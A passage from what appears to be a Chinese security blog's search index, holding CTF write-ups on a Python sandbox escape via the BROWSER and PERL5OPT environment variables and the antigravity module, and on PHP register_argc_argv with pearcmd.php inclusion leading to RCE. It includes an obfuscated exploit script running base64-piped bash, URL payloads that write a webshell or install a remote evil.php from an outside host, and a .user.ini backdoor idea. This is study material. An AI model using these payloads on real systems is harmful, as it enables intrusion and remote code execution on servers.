\u9009\u9879\u5bfc\u5165\u6a21\u5757\uff0c\u540c\u65f6\u5728\u8fd9\u4e4b\u540e\u53ef\u4ee5\u6ce8\u5165\u4e00\u6bb5perl\u4ee3\u7801\uff0c\u5229\u7528\u8fd9\u4e2a\u6700\u7ec8\u5b9e\u73b0\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002 \u6211\u4eec\u91cd\u70b9\u5173\u6ce8BROWSER\u73af\u5883\u53d8\u91cf\u548c antigravity \u8fd9\u4e2a\u6a21\u5757\u3002 antigravity \u8fd9\u4e2a\u6a21\u5757\u5b9e\u9645\u4e0a\u662f\u5728python\u6dfb\u52a0\u7684\u4e00\u4e2a\u5723\u8bde\u8282\u5f69\u86cb\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 \u8fd9\u91cc \u770b\u5230\u5b83\u7684\u6e90\u7801: \u8fd9\u91cc\u552f\u4e00\u503c\u5f97\u6ce8\u610f\u7684\u662f\u5176\u5728\u88ab\u5bfc\u5165\u65f6\u4f1a\u8c03\u7528 webbrowser.open() \u65b9\u6cd5\u6253\u5f00\u4e00\u4e2a\u7f51\u7ad9\uff0c\u6211\u4eec\u5728cpython\u4e2d\u770b\u770b\u5176 \u4ee3\u7801 \u7684\u5b9e\u73b0\uff0c\u91cd\u70b9\u5173\u6ce8\u4ee5\u4e0b\u51e0\u4e2a\u51fd\u6570: open\u51fd\u6570\u4f1a\u5728\u6ca1\u6709browser\u65f6\u5148\u6ce8\u518c\uff0c\u7136\u540e\u8c03\u7528 browser.open() \u53bb\u6253\u5f00\u5bf9\u5e94\u7684\u7f51\u5740: def open ( url , new = 0 , autoraise = True ): \"\"\"Display url using the default browser. If possible, open url in a location determined by new. - 0: the same browser window (the default). - 1: a new browser window. - 2: a new browser page (\"tab\"). If possible, autoraise raises the window (the default) or not. \"\"\" if _tryorder is None : with _lock : if _tryorder is None : register_standard_browsers () for name in _tryorder : browser = get ( name ) if browser . open ( url , new , autoraise ): return True return False register standard browsers\u51fd\u6570\u4f1a\u8c03\u7528register\u51fd\u6570\u6ce8\u518c\u6d4f\u89c8\u5668\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u5c06\u6d4f\u89c8\u5668\u540d\u5b57\u4e0e\u5bf9\u5e94\u7684\u7c7b\u7ed1\u5b9a\u5728\u4e86\u4e00\u8d77\uff0c\u6211\u4eec\u6ce8\u610f\u5230\u8fd9\u91cc\u4f7f\u7528\u5230\u4e86\u4e00\u4e2a\u73af\u5883\u53d8\u91cf BROWSER \uff0c\u53ef\u4ee5\u5141\u8bb8\u4f7f\u7528\u8005\u8986\u76d6\u81ea\u5df1\u7684\u6d4f\u89c8\u5668\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u5176\u6700\u7ec8\u4f1a\u6ce8\u518c\u4e00\u4e2aGenericBrowser\u7c7b: def register_standard_browsers (): global _tryorder _tryorder = [] if sys . platform == 'darwin' : register ( \"MacOSX\" , None , MacOSXOSAScript ( 'default' )) register ( \"chrome\" , None , MacOSXOSAScript ( 'chrome' )) register ( \"firefox\" , None , MacOSXOSAScript ( 'firefox' )) register ( \"safari\" , None , MacOSXOSAScript ( 'safari' )) # OS X can use below Unix support (but we prefer using the OS X # specific stuff) if sys . platform == \"serenityos\" : # SerenityOS webbrowser, simply called \"Browser\". register ( \"Browser\" , None , BackgroundBrowser ( \"Browser\" )) if sys . platform [: 3 ] == \"win\" : # First try to use the default Windows browser register ( \"windows-default\" , WindowsDefault ) # Detect some common Windows browsers, fallback to IE iexplore = os . path . join ( os . environ . get ( \"PROGRAMFILES\" , \"C: \\\\ Program Files\" ), \"Internet Explorer \\\\ IEXPLORE.EXE\" ) for browser in ( \"firefox\" , \"firebird\" , \"seamonkey\" , \"mozilla\" , \"netscape\" , \"opera\" , iexplore ): if shutil . which ( browser ): register ( browser , None , BackgroundBrowser ( browser )) else : # Prefer X browsers if present if os . environ . get ( \"DISPLAY\" ) or os . environ . get ( \"WAYLAND_DISPLAY\" ): try : cmd = \"xdg-settings get default-web-browser\" . split () raw_result = subprocess . check_output ( cmd , stderr = subprocess . DEVNULL ) result = raw_result . decode () . strip () except ( FileNotFoundError , subprocess . CalledProcessError , PermissionError , NotADirectoryError ) : pass else : global _os_preferred_browser _os_preferred_browser = result register_X_browsers () # Also try console browsers if os . environ . get ( \"TERM\" ): if shutil . which ( \"www-browser\" ): register ( \"www-browser\" , None , GenericBrowser ( \"www-browser\" )) # The Links/elinks browsers <http://artax.karlin.mff.cuni.cz/~mikulas/links/> if shutil . which ( \"links\" ): register ( \"links\" , None , GenericBrowser ( \"links\" )) if shutil . which ( \"elinks\" ): register ( \"elinks\" , None , Elinks ( \"elinks\" )) # The Lynx browser <http://lynx.isc.org/>, <http://lynx.browser.org/> if shutil . which ( \"lynx\" ): register ( \"lynx\" , None , GenericBrowser ( \"lynx\" )) # The w3m browser <http://w3m.sourceforge.net/> if shutil . which ( \"w3m\" ): register ( \"w3m\" , None , GenericBrowser ( \"w3m\" )) # OK, now that we know what the default preference orders for each # platform are, allow user to override them with the BROWSER variable. if \"BROWSER\" in os . environ : userchoices = os . environ [ \"BROWSER\" ] . split ( os . pathsep ) userchoices . reverse () # Treat choices in same way as if passed into get() but do register # and prepend to _tryorder for cmdline in userchoices : if cmdline != '' : cmd = _synthesize ( cmdline , preferred = True ) if cmd [ 1 ] is None : register ( cmdline , None , GenericBrowser ( cmdline ), preferred = True ) GenericBrowser.open() \u51fd\u6570\u662f\u6211\u4eec\u6700\u7ec8\u7684\u76ee\u7684\uff0c\u5176\u5b9e\u9645\u4e0a\u8c03\u7528\u4e86 subprocess.open() \u51fd\u6570\u6765\u5b9e\u73b0\u4f7f\u7528\u6d4f\u89c8\u5668\u6253\u5f00\u7684\u76ee\u7684: class GenericBrowser ( BaseBrowser ): \"\"\"Class for all browsers started with a command and without remote functionality.\"\"\" def __init__ ( self , name ): if isinstance ( name , str ): self . name = name self . args = [ \" %s \" ] else : # name should be a list with arguments self . name = name [ 0 ] self . args = name [ 1 :] self . basename = os . path . basename ( self . name ) def open ( self , url , new = 0 , autoraise = True ): sys . audit ( \"webbrowser.open\" , url ) cmdline = [ self . name ] + [ arg . replace ( \" %s \" , url ) for arg in self . args ] try : if sys . platform [: 3 ] == 'win' : p = subprocess . Popen ( cmdline ) else : p = subprocess . Popen ( cmdline , close_fds = True ) return not p . wait () except OSError : return False \u7efc\u4e0a\u6240\u8ff0\uff0c\u5982\u679c\u6211\u4eec\u63a7\u5236\u4e86 BROWSER \u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u5c31\u53ef\u4ee5\u63a7\u5236\u547d\u4ee4\u6267\u884c\u8c03\u7528\u7684\u547d\u4ee4\uff0c\u6700\u7ec8\u6267\u884c\u7c7b\u4f3c\u4e8e BROWSER https://xkcd.com/353/ \u8fd9\u6837\u7684\u547d\u4ee4\uff0c\u6211\u4eec\u662f\u6ca1\u529e\u6cd5\u63a7\u5236\u547d\u4ee4\u7684\u53c2\u6570\u7684\u3002\u8fd9\u91cc\u5c31\u9700\u8981\u5229\u7528\u5230\u5176\u4ed6\u547d\u4ee4\u7684\u73af\u5883\u53d8\u91cf\u6ce8\u5165\u4e86\u3002 \u5728\u4e00\u822c\u7684linux\u53d1\u884c\u7248\u4e2d\uff0c\u4e00\u822c\u81ea\u5e26\u4e86perl\u8fd9\u4e2a\u7f16\u7a0b\u8bed\u8a00\u4ee5\u53ca\u9ed8\u8ba4\u7684perl\u811a\u672c\uff0c\u4f8b\u5982perldoc\u548cperlthanks\uff0c\u8fd9\u91ccexp\u6700\u7ec8\u4f7f\u7528\u7684\u662fperlthanks/perldoc\u800c\u975e\u4f7f\u7528perl\u7684\u539f\u56e0\u662f\u5982\u679c\u6267\u884c perl https://xkcd.com/353/ \uff0c\u90a3\u4e48perl\u4f1a\u62a5\u9519\u8fd4\u56de\uff0c\u4e0d\u4f1a\u5904\u7406 PERL5OPT \u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u800c perldoc \u4e0e perlthanks \u8fd92\u4e2a\u811a\u672c\u5219\u518d\u5904\u7406\u4e86 PERL5OPT \u4e4b\u540e\u8fd4\u56de\uff0c\u8fd9\u7ed9\u4e86\u6211\u4eec\u6700\u7ec8exp\u7684\u673a\u4f1a\u3002 \u6700\u7ec8\u6211\u4eec\u6765\u56de\u987e\u4e00\u4e0bexp\uff0c\u9664\u4e86\u4e0a\u9762\u63d0\u5230\u7684\u70b9\u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u4f7f\u7528\u4e86 string.printable \u8fd9\u4e32\u5b57\u7b26\u4e32\u6765\u6784\u9020\u4efb\u610f\u5b57\u7b26\uff0c\u5176\u5305\u542b\u4e86\u6240\u6709\u53ef\u89c1\u7684ascii\u5b57\u7b26\u3002 from string import printable from base64 import b64decode from unicodedata import normalize def translate ( s ): r = \"\" for c in s : r += f \"x[ { printable . find ( c ) } ]+\" return r . rstrip ( \"+\" ) code = f \"\"\" from os import environ from string import printable as x environ[ { translate ( \"PERL5OPT\" ) } ] = { translate ( \"-Mbase;system('echo$IFS$9bHM=|base64$IFS$9-d|bash');exit;\" ) } environ[ { translate ( \"BROWSER\" ) } ] = { translate ( \"perlthanks\" ) } import antigravity \"\"\" # exp normalize ( \"NFKC\" , code ) for c in 'h\" \\' (@_' : if c in code : print ( \"no!!!!\" ) exit ( 0 ) exec ( code )","title":"\u66f4\u8fdb\u4e00\u6b65"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/","tags":["php","\u6587\u4ef6\u5305\u542b","php\u914d\u7f6e"],"text":"register argc argv\u4e0einclude to RCE\u7684\u5de7\u5999\u7ec4\u5408 # \u5f15\u5b50\u662f\u5dc5\u5cf0\u6781\u5ba22020\u7684 Meow World ,\u9898\u76ee\u603b\u7ed3\u4e0b\u6765\u53ea\u6709\u4e00\u53e5\u8bdd: <?php include $_GET [ 'f' ] . \".php\" ; \u771f\u7684\u662f\u5f00\u5c40\u4e00\u4e2ainclude,getshell\u5168\u9760\u731c,\u6bd4\u8d5b\u65f6\u63d0\u793aregister argc argv,\u4f46\u6ca1\u505a\u51fa\u6765,\u8d5b\u540e\u770b\u4e86\u522b\u4eba\u7684wp\u548c\u603b\u7ed3,\u81ea\u5df1\u4e5f\u6253\u7b97\u5199\u4e00\u4e2a\u5c0f\u7ed3. register argc argv # \u9996\u5148\u4e86\u89e3\u5230\u8fd9\u4e2a\u53c2\u6570\u9ed8\u8ba4\u662fOn\u7684: \u4f46\u662f\u7ecf\u8fc7\u540e\u6765\u6d4b\u8bd5\u53d1\u73b0\u4f46\u51e1\u914d\u7f6e\u4e86php.ini\u7684php\u91cc\u90fd\u4f1a\u663e\u793a\u58f0\u660e\u8be5\u53c2\u6570\u4e3aOff,\u90a3\u4e48\u8fd9\u4e2a\u53c2\u6570\u662f\u7528\u6765\u505a\u4ec0\u4e48\u7684\u5462? \u8fd9\u91cc\u4ecb\u7ecd\u4e86register argc argv\u7684\u4f5c\u7528,\u5f53\u8fd9\u4e2a\u53c2\u6570\u5f00\u542f\u7684\u65f6\u5019,php\u4f1a\u6ce8\u518cargc\u548cargv\u8fd9\u4e2a\u5168\u5c40\u53d8\u91cf,\u5e76\u4e14\u901a\u8fc7\u7b2c\u4e8c\u4e2a\u56fe\u53ef\u77e5\u6211\u4eec\u53ef\u4ee5\u4ece$_SERVER['argv'] \u4e2d\u83b7\u53d6\u5230\u8fd9\u4e9b\u503c. \u8fd9\u91cc\u5c31\u8981\u77e5\u9053php\u4f5c\u4e3a\u4e00\u79cd\u811a\u672c\u8bed\u8a00,\u5f53\u7136\u53ef\u4ee5\u7528\u4e8e\u7f16\u5199\u547d\u4ee4\u884c\u811a\u672c,\u800c\u6211\u4eec\u53ef\u4ee5\u5728\u811a\u672c\u4e2d\u76f4\u63a5\u8bbf\u95ee argv , argv , argc \u8fd9\u4e24\u4e2a\u5168\u5c40\u53d8\u91cf. \u8fd9\u91cc\u5b9e\u9645\u6d4b\u8bd5\u4e0b\u8f7dregister argc argv\u5f00\u542f\u7684\u60c5\u51b5\u4e0b _SERVER['argv']\u4e0e _SERVER['argv']\u4e0e argv\u7684\u503c: <?php var_dump ( $_SERVER [ 'argv' ]); var_Dump ( $argv ); \u7f51\u9875\u7aef\u4e2d: \u547d\u4ee4\u884c\u6a21\u5f0f\u4e0b: \u800c\u5728register argc argv\u5173\u95ed\u7684\u60c5\u51b5\u4e0b,$_SERVER['argv']\u4e0d\u4f1a\u62ff\u5230\u4efb\u4f55\u53d6\u503c pear # \u63a5\u4e0b\u6765\u5c31\u8981\u4ecb\u7ecdpear\u8fd9\u4e2a\u547d\u4ee4,\u7b80\u4ecb\u5982\u4e0b: pear # Pear \u662f PHP \u6269\u5c55\u4e0e\u5e94\u7528\u5e93\uff08the PHP Extension and Application Repository\uff09\u7684\u7f29\u5199\uff0c\u662f\u4e00\u4e2a PHP \u6269\u5c55\u53ca\u5e94\u7528\u7684\u4e00\u4e2a\u4ee3\u7801\u4ed3\u5e93\u3002Pear \u4ed3\u5e93\u4ee3\u7801\u662f\u4ee5\u5305\uff08package\uff09\u5206\u533a\uff0c\u6bcf\u4e00\u4e2a Pear package \u90fd\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u9879\u76ee\u6709\u7740\u81ea\u5df1\u72ec\u7acb\u7684\u5f00\u53d1\u56e2\u961f\u3001\u7248\u672c\u63a7\u5236\u3001\u6587\u6863\u548c\u5176\u4ed6\u5305\u7684\u4f9d\u8d56\u5173\u7cfb\u4fe1\u606f\u3002Pear package \u4ee5 phar\u3001tar \u6216 zip \u53d1\u5e03\u3002 \u65e2\u7136\u662f\u4e2a\u5305\u7ba1\u7406\u5668,\u90a3\u4e48\u5c31\u5e94\u8be5\u5b58\u5728\u4e0b\u8f7d\u548c\u5b89\u88c5\u5305\u7684\u529f\u80fd,\u90a3\u4e48pear\u547d\u4ee4\u662f\u5982\u4f55\u5b9e\u73b0\u7684\u5462? \u5b9e\u9645\u4e0apear\u547d\u4ee4\u662fsh\u811a\u672c,\u6e90\u7801\u5982\u4e0b: #!/bin/sh # first find which PHP binary to use if test \"x $PHP_PEAR_PHP_BIN \" ! = \"x\" ; then PHP = \" $PHP_PEAR_PHP_BIN \" else if test \"/usr/local/bin/php\" = '@' php_bin '@' ; then PHP = php else PHP = \"/usr/local/bin/php\" fi fi # then look for the right pear include dir if test \"x $PHP_PEAR_INSTALL_DIR \" ! = \"x\" ; then INCDIR = $PHP_PEAR_INSTALL_DIR INCARG = \"-d include_path= $PHP_PEAR_INSTALL_DIR \" else if test \"/usr/local/lib/php\" = '@' php_dir '@' ; then INCDIR = ` dirname $0 ` INCARG = \"\" else INCDIR = \"/usr/local/lib/php\" INCARG = \"-d include_path=/usr/local/lib/php\" fi fi exec $PHP -C -q $INCARG -d date.timezone = UTC -d output_buffering = 1 -d variables_order = EGPCS -d open_basedir = \"\" -d safe_mode = 0 -d register_argc_argv = \"On\" -d auto_prepend_file = \"\" -d auto_append_file = \"\" $INCDIR /pearcmd.php \" $@ \" \u901a\u8fc7\u770b\u6700\u540e\u4e00\u884c\u53ef\u4ee5\u77e5\u9053\u5176\u5b9e\u5b83\u662f\u901a\u8fc7php\u8c03\u7528\u4e86pearcmd.php,\u90a3\u4e48pearcmd.php\u4e2d$argv\u662f\u4ece\u54ea\u91cc\u6765\u7684\u5462,\u901a\u8fc7\u7b80\u5355\u67e5\u627e\u53ef\u4ee5\u770b\u5230\u5176\u8c03\u7528\u4e86\u53e6\u4e00\u4e2aphp\u6587\u4ef6\u4e2d\u67d0\u4e2a\u7c7b\u65b9\u6cd5: require_once 'Console/Getopt.php'; /* ... */ $argv = Console_Getopt::readPHPArgv(); \u518d\u6b21\u8ddf\u8fdbConsole/Getopt.php,\u627e\u5230\u8be5\u65b9\u6cd5\u7684\u5b9e\u73b0: public static function readPHPArgv() { global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = \"Could not read cmd args (register_argc_argv=Off?)\"; return PEAR::raiseError(\"Console_Getopt: \" . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv; } \u53ef\u4ee5\u770b\u5230\u83b7\u53d6$argv\u7684\u65b9\u5f0f\u662f global $argv --> $_SERVER['argv'] --> $GLOBALS['HTTP_SERVER_VARS']['argv'] \u540c\u65f6\u6211\u4eec\u77e5\u9053\u5f53\u6211\u4eecinclude\u4e00\u4e2a\u53ef\u4ee5\u88abphp\u89e3\u6790\u7684\u6587\u4ef6\u7684\u65f6\u5019,php\u4ee3\u7801\u4f1a\u88ab\u81ea\u52a8\u6267\u884c,\u8fd9\u6837\u5728register argc argv\u5f00\u542f\u7684\u60c5\u51b5\u4e0b\u6211\u4eec\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u5305\u542bpearcmd.php\u4e0e\u64cd\u63a7$_SERVER['argv']\u6765\u6267\u884cpear\u547d\u4ee4 pear\u547d\u4ee4\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d # \u6211\u4eec\u5148\u6765\u770b\u770b\u5982\u4f55\u901a\u8fc7pear\u547d\u4ee4\u6765\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d: \u5728\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2atmp.php \u4f7f\u7528python\u4e00\u53e5\u8bdd\u5f00\u542fhttp\u670d\u52a1\u5668: python -m SimpleHTTPServer 8080 \u901a\u8fc7\u6267\u884c pear \u547d\u4ee4\u83b7\u53d6\u5e2e\u52a9,\u53d1\u73b0\u5b58\u5728download\u9009\u9879,\u5c1d\u8bd5\u6267\u884c pear download http://127.0.0.1:8080/tmp.php ,\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u6210\u529f\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u8f7d\u4e86tmp.php: \u6709\u6ca1\u6709\u529e\u6cd5\u63a7\u5236\u4e0b\u8f7d\u76ee\u5f55?\u7b54\u6848\u662f\u4f7f\u7528install -R\u800c\u975edownload,\u5c1d\u8bd5\u6267\u884c pear install -R /var/www/html http://127.0.0.1:8080/tmp.php \u6210\u529f\u4e0b\u8f7d\u5230web\u76ee\u5f55\u4e0b\u5e76\u80fd\u591f\u8bbf\u95ee \u5982\u4f55\u63a7\u5236$_SERVER['argv'] # \u5982\u4f55\u5f80$_SERVER['argv']\u4f20\u51652\u4e2a\u6216\u4ee5\u4e0a\u7684\u53c2\u6570?\u6d4b\u8bd5\u4e00\u4e0b: \u5e76\u4e0d\u80fd\u901a\u8fc7&\u4f5c\u4e3a$_SERVER['argv']\u7684\u5206\u5272,\u901a\u8fc7\u67e5\u9605\u8d44\u6599\u548c\u9605\u8bfb\u6e90\u7801: main/php_variables.c PHPAPI void php_build_argv ( const char * s , zval * track_vars_array ) { zval arr , argc , tmp ; int count = 0 ; if ( ! ( SG ( request_info ). argc || track_vars_array )) { return ; } array_init ( & arr ); /* Prepare argv */ if ( SG ( request_info ). argc ) { /* are we in cli sapi? */ int i ; for ( i = 0 ; i < SG ( request_info ). argc ; i ++ ) { ZVAL_STRING ( & tmp , SG ( request_info ). argv [ i ]); if ( zend_hash_next_index_insert ( Z_ARRVAL ( arr ), & tmp ) == NULL ) { zend_string_efree ( Z_STR ( tmp )); } } } else if ( s && * s ) { while ( 1 ) { const char * space = strchr ( s , '+' ); /* auto-type */ ZVAL_STRINGL ( & tmp , s , space ? space - s : strlen ( s )); count ++ ; if ( zend_hash_next_index_insert ( Z_ARRVAL ( arr ), & tmp ) == NULL ) { zend_string_efree ( Z_STR ( tmp )); } if ( ! space ) { break ; } s = space + 1 ; } } \u53ef\u4ee5\u77e5\u9053argv\u901a\u8fc7query_string\u53d6\u503c,\u5e76\u901a\u8fc7+\u4f5c\u4e3a\u5206\u5272\u7b26,\u5c1d\u8bd5\u4e00\u4e0b: \u56de\u5230\u9898\u76ee # \u73b0\u5728\u56de\u5230\u9898\u76ee,\u6211\u4eec\u6240\u6709\u7684\u62fc\u56fe\u5df2\u7ecf\u51d1\u9f50\u4e86,\u5047\u5982\u5b58\u5728\u4ee5\u4e0b\u73af\u5883: \u5b89\u88c5\u4e86pear \u5f00\u542f\u4e86register argc argv \u5b58\u5728\u53ef\u63a7\u7684 include $_GET['f'] (\u5373\u4f7f\u662f include $_GET['f'].php ) \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u4e0a\u9762\u7684\u77e5\u8bc6\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u4ece\u800cgetshell: //\u901a\u8fc7\u672c\u5730\u76f4\u63a5\u5199\u5165webshell,\u6ce8\u610f\u8fd9\u91cc\u6700\u597d\u6293\u5305\u7136\u540e\u7528burpsuite\u6216\u8005\u76f4\u63a5curl\u6267\u884c\uff0c\u5426\u5219\u6d4f\u89c8\u5668\u4f1a\u5c06< ? > \u8f6c\u4e49 // config-create\u53ef\u4ee5\u76f4\u63a5\u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff0c\u4e14\u7b2c\u4e00\u4e2a\u53c2\u6570\u5fc5\u987b\u4ee5/\u5f00\u5934 http://ip:port/include.php?f=pearcmd&+config-create+/<?=phpinfo();?>+/tmp/evil.php // \u901a\u8fc7\u8fdc\u7a0b\u76f4\u63a5\u4e0b\u8f7dwebshell // web\u76ee\u5f55\u53ef\u5199 - http://ip:port/include.php?f=pearcmd&+install+-R+/var/www/html+http://ip:port/evil.php - http://ip:port/tmp/pear/download/evil.php // tmp\u76ee\u5f55\u53ef\u5199 - http://ip:port/include.php?f=pearcmd&+install+-R+/tmp+http://ip:port/evil.php - http://ip:port/include.php?f=/tmp/pear/download/evil &+install+-R+/tmp+ http://162.14.65.110:8888/1.php \u540e\u95e8 # \u524d\u9762\u63d0\u5230register argc argv\u662fPHP INI PERDIR\u7684,\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u65b0\u5efa\u4e00\u4e2a.user.ini\u8bbe\u7f6eregister argc argv\u4e3aOn\u7528\u4e8e\u7559\u540e\u95e8 \u6700\u540e:docker # \u5728php\u5b98\u65b9\u63d0\u4f9b\u7684\u955c\u50cf\u4e0b,\u9ed8\u8ba4\u662f\u4e0d\u4f7f\u7528php.ini\u7684(\u5728/usr/local/etc/php\u4e2d\u5b58\u5728php.ini-production\u548cphp.ini-development,\u9700\u8981\u624b\u52a8\u4fee\u6539\u4efb\u610f\u4e00\u4e2a\u6587\u4ef6\u540d\u4e3aphp.ini\u624d\u4f1a\u542f\u52a8php.ini,\u800c\u4e0a\u9762\u6211\u4eec\u63d0\u5230\u5728php.ini\u4e2dregister argc argv\u90fd\u8bbe\u7f6e\u4e3aOff) \u800cregister argc argv\u5728\u4e0d\u8bbe\u7f6e\u7684\u60c5\u51b5\u4e0b\u9ed8\u8ba4\u4e3aOn,\u90a3\u4e48\u5047\u5982\u6709\u4e00\u4e2a\u9ed8\u8ba4\u7684docker-php\u73af\u5883,\u5e76\u5b58\u5728\u53ef\u63a7\u7684 include $_GET['f'] (\u5373\u4f7f\u662finclude $_GET['f'].php),\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u5b9e\u73b0getshell","title":"register_argc_argv\u4e0einclude to RCE\u7684\u5de7\u5999\u7ec4\u5408"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/#registerargcargv\u4e0einclude-to-rce\u7684\u5de7\u5999\u7ec4\u5408","text":"\u5f15\u5b50\u662f\u5dc5\u5cf0\u6781\u5ba22020\u7684 Meow World ,\u9898\u76ee\u603b\u7ed3\u4e0b\u6765\u53ea\u6709\u4e00\u53e5\u8bdd: <?php include $_GET [ 'f' ] . \".php\" ; \u771f\u7684\u662f\u5f00\u5c40\u4e00\u4e2ainclude,getshell\u5168\u9760\u731c,\u6bd4\u8d5b\u65f6\u63d0\u793aregister argc argv,\u4f46\u6ca1\u505a\u51fa\u6765,\u8d5b\u540e\u770b\u4e86\u522b\u4eba\u7684wp\u548c\u603b\u7ed3,\u81ea\u5df1\u4e5f\u6253\u7b97\u5199\u4e00\u4e2a\u5c0f\u7ed3.","title":"registerargcargv\u4e0einclude to RCE\u7684\u5de7\u5999\u7ec4\u5408"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/#registerargcargv","text":"\u9996\u5148\u4e86\u89e3\u5230\u8fd9\u4e2a\u53c2\u6570\u9ed8\u8ba4\u662fOn\u7684: \u4f46\u662f\u7ecf\u8fc7\u540e\u6765\u6d4b\u8bd5\u53d1\u73b0\u4f46\u51e1\u914d\u7f6e\u4e86php.ini\u7684php\u91cc\u90fd\u4f1a\u663e\u793a\u58f0\u660e\u8be5\u53c2\u6570\u4e3aOff,\u90a3\u4e48\u8fd9\u4e2a\u53c2\u6570\u662f\u7528\u6765\u505a\u4ec0\u4e48\u7684\u5462? \u8fd9\u91cc\u4ecb\u7ecd\u4e86register argc argv\u7684\u4f5c\u7528,\u5f53\u8fd9\u4e2a\u53c2\u6570\u5f00\u542f\u7684\u65f6\u5019,php\u4f1a\u6ce8\u518cargc\u548cargv\u8fd9\u4e2a\u5168\u5c40\u53d8\u91cf,\u5e76\u4e14\u901a\u8fc7\u7b2c\u4e8c\u4e2a\u56fe\u53ef\u77e5\u6211\u4eec\u53ef\u4ee5\u4ece$_SERVER['argv'] \u4e2d\u83b7\u53d6\u5230\u8fd9\u4e9b\u503c. \u8fd9\u91cc\u5c31\u8981\u77e5\u9053php\u4f5c\u4e3a\u4e00\u79cd\u811a\u672c\u8bed\u8a00,\u5f53\u7136\u53ef\u4ee5\u7528\u4e8e\u7f16\u5199\u547d\u4ee4\u884c\u811a\u672c,\u800c\u6211\u4eec\u53ef\u4ee5\u5728\u811a\u672c\u4e2d\u76f4\u63a5\u8bbf\u95ee argv , argv , argc \u8fd9\u4e24\u4e2a\u5168\u5c40\u53d8\u91cf. \u8fd9\u91cc\u5b9e\u9645\u6d4b\u8bd5\u4e0b\u8f7dregister argc argv\u5f00\u542f\u7684\u60c5\u51b5\u4e0b _SERVER['argv']\u4e0e _SERVER['argv']\u4e0e argv\u7684\u503c: <?php var_dump ( $_SERVER [ 'argv' ]); var_Dump ( $argv ); \u7f51\u9875\u7aef\u4e2d: \u547d\u4ee4\u884c\u6a21\u5f0f\u4e0b: \u800c\u5728register argc argv\u5173\u95ed\u7684\u60c5\u51b5\u4e0b,$_SERVER['argv']\u4e0d\u4f1a\u62ff\u5230\u4efb\u4f55\u53d6\u503c","title":"registerargcargv"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/#pear","text":"\u63a5\u4e0b\u6765\u5c31\u8981\u4ecb\u7ecdpear\u8fd9\u4e2a\u547d\u4ee4,\u7b80\u4ecb\u5982\u4e0b:","title":"pear"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/#pear_1","text":"Pear \u662f PHP \u6269\u5c55\u4e0e\u5e94\u7528\u5e93\uff08the PHP Extension and Application Repository\uff09\u7684\u7f29\u5199\uff0c\u662f\u4e00\u4e2a PHP \u6269\u5c55\u53ca\u5e94\u7528\u7684\u4e00\u4e2a\u4ee3\u7801\u4ed3\u5e93\u3002Pear \u4ed3\u5e93\u4ee3\u7801\u662f\u4ee5\u5305\uff08package\uff09\u5206\u533a\uff0c\u6bcf\u4e00\u4e2a Pear package \u90fd\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u9879\u76ee\u6709\u7740\u81ea\u5df1\u72ec\u7acb\u7684\u5f00\u53d1\u56e2\u961f\u3001\u7248\u672c\u63a7\u5236\u3001\u6587\u6863\u548c\u5176\u4ed6\u5305\u7684\u4f9d\u8d56\u5173\u7cfb\u4fe1\u606f\u3002Pear package \u4ee5 phar\u3001tar \u6216 zip \u53d1\u5e03\u3002 \u65e2\u7136\u662f\u4e2a\u5305\u7ba1\u7406\u5668,\u90a3\u4e48\u5c31\u5e94\u8be5\u5b58\u5728\u4e0b\u8f7d\u548c\u5b89\u88c5\u5305\u7684\u529f\u80fd,\u90a3\u4e48pear\u547d\u4ee4\u662f\u5982\u4f55\u5b9e\u73b0\u7684\u5462? \u5b9e\u9645\u4e0apear\u547d\u4ee4\u662fsh\u811a\u672c,\u6e90\u7801\u5982\u4e0b: #!/bin/sh # first find which PHP binary to use if test \"x $PHP_PEAR_PHP_BIN \" ! = \"x\" ; then PHP = \" $PHP_PEAR_PHP_BIN \" else if test \"/usr/local/bin/php\" = '@' php_bin '@' ; then PHP = php else PHP = \"/usr/local/bin/php\" fi fi # then look for the right pear include dir 